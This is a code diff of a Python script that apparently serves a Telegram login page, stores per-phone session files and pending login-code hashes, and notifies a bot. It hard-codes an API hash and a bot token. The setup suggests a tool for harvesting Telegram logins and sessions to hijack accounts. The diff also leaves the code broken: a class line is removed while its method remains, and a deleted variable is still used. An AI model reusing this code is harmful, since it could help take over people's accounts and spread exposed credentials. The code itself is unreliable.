@@ -25,20 +25,11 @@ API_HASH = "2c4cb6eee01a46dc648114813042c453"
 BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
 bot = Bot(BOT_TOKEN)
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
-os.makedirs(SESSIONS_DIR, exist_ok=True)
-BOT_NOTIFY_URL = "https://telegram-bots-production-af1b.up.railway.app/miniapp"
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-AUTHORIZED_FILE = os.path.join(BASE_DIR, "authorized_users.json")
-
 # phone -> {client, phone_code_hash}
 pending = {}
 
 def session_path(phone):
     return os.path.join(SESSIONS_DIR, phone.replace("+", ""))
-
-class LoginHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         if self.path in ["/", "/login.html"]:
@@ -200,6 +191,7 @@ def auth():
 # =========================
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
